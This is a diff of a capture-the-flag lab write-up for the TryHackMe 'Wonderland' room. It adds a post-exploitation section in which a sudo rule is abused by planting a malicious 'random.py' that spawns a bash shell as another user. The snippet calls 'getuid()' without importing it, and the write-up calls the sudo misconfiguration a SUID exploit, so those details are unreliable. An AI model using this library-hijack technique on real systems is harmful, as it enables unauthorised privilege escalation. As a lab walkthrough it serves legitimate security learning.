@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T16:17:31.873+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T16:50:24.249+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"]}}
 ---
 
 ![](/img/user/Attachments/wonderland.png)
@@ -95,9 +95,15 @@ Extracting the file from the image with the confirmed by `""` empty password is 
 
 Once again the room states to follow the rabbit. 
 
+> Moving to Enumeration #2 from here
+
 ------
 
 ## Post-exploitation
+
+![](/img/user/Attachments/users-on-ssytem.png)
+
+There are 4 existing users on the system
 
 ```
 # Listing what is in Alice's home directory
@@ -105,11 +111,33 @@ Once again the room states to follow the rabbit.
 -rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
 ```
 
-There is a root.txt which obviously is unreadable as the user alice. The room states a `user.txt` file is present. 
+There is a root.txt which obviously is unreadable as the user alice. The room states a `user.txt` file is present. Furthermore there is a poem with nothing valuable saved in a .py file. 
 
-![](/img/user/Attachments/users-on-ssytem.png)
+**Attack Path**
+Running `sudo -l` reveals valuable intel. Alice is able to execute the useless **.py** poem as the other user **rabbit** without the need for his password. Checking the content of the file out it is importing the library random. Lets exploit that.
 
-There are 4 existing users on the system
+### Exploiting SUID-binaries 
+
+**Payload**
+`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
+
+> Note it is required to specify the full path when exploiting this suid binary vulnerability
+
+```
+# malicious random.py library
+import os
+import pty
+os.setuid(getuid())
+pty.spawn("/bin/bash")
+```
+
+------
+
+### Moving on as Rabbit
+
+![](/img/user/Attachments/rabbitshell.png)
+
+Sure enough the shell to **rabbit** is a success.
 
 
 ## Pwnage
